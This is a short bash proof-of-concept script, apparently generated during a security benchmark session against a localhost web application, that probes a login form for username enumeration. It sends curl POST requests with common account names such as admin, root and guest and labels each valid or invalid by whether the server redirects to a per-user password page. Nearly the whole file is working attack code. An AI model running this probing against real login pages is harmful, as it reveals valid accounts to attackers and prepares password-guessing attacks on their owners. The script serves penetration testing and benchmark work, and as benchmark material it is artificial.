#!/bin/bash
# POC: Demonstrates user account enumeration via differential response behavior in login form. Valid usernames trigger redirects to /password/{username}, while invalid usernames return HTTP 200 without redirect.
# Target: ./repo
# Created: 2025-11-04T14:33:13.109Z
# Session: benchmark-XBEN-027-24-mhknolag

# User Account Enumeration POC
# Demonstrates username validation disclosure via differential response behavior
# Valid usernames redirect to /password/{username}, invalid return HTTP 200

TARGET_URL="http://localhost:8080"
USERNAMES=("test" "admin" "root" "guest" "user1" "john" "alice" "bob")

echo "=========================================="
echo "Username Enumeration via Response Analysis"
echo "=========================================="
echo "Target: $TARGET_URL"
echo ""

# Test valid username
echo "[*] Testing known valid username: 'test'"
RESPONSE=$(curl -s -X POST "$TARGET_URL/" -d "username=test" -i)
HTTP_CODE=$(echo "$RESPONSE" | head -n 1 | awk '{print $2}')
LOCATION=$(echo "$RESPONSE" | grep -i "^Location:" | cut -d' ' -f2 | tr -d '\r')

echo "HTTP Status: $HTTP_CODE"
echo "Location Header: $LOCATION"
if [ ! -z "$LOCATION" ]; then
    echo "Result: VALID USER DETECTED (redirect to $LOCATION)"
else
    echo "Result: No redirect detected"
fi
echo ""

# Test invalid usernames
echo "[*] Testing invalid usernames for enumeration pattern:"
for username in "admin" "root" "guest" "nonexistent" "hacker"; do
    RESPONSE=$(curl -s -X POST "$TARGET_URL/" -d "username=$username" -i)
    HTTP_CODE=$(echo "$RESPONSE" | head -n 1 | awk '{print $2}')
    LOCATION=$(echo "$RESPONSE" | grep -i "^Location:" | cut -d' ' -f2 | tr -d '\r')
    
    if [ ! -z "$LOCATION" ]; then
        echo "  ✓ $username -> HTTP $HTTP_CODE -> REDIRECT to $LOCATION (VALID USER)"
    else
        echo "  ✗ $username -> HTTP $HTTP_CODE -> NO REDIRECT (Invalid user)"
    fi
done

echo ""
echo "[+] Enumeration Complete"
echo "[+] Differential response behavior confirmed:"
echo "    - Valid users: HTTP 302 with Location header"
echo "    - Invalid users: HTTP 200 without Location header"
echo "[+] This allows attackers to systematically probe for valid usernames"